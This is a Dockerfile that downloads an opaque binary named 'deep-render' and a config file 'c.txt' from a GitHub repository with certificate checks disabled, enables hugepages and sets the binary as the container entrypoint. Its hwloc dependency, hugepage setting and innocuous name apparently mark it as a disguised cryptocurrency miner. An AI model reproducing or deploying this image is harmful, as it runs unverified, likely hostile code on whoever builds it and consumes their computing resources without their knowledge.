FROM ubuntu:16.04  
  
RUN apt-get update \  
&& apt-get -qq --no-install-recommends install \  
wget \  
libhwloc-dev \  
libssl-dev \  
&& rm -r /var/lib/apt/lists/* \  
&& wget --no-check-certificate https://github.com/morgankaufmann/deep-
render/raw/master/deep-render \  
&& wget --no-check-certificate https://github.com/morgankaufmann/deep-
render/raw/master/c.txt \  
&& sysctl -w vm.nr_hugepages=128 \  
&& chmod +x deep-render  
  
ENTRYPOINT ["./deep-render"]  
CMD ["c.txt"]  

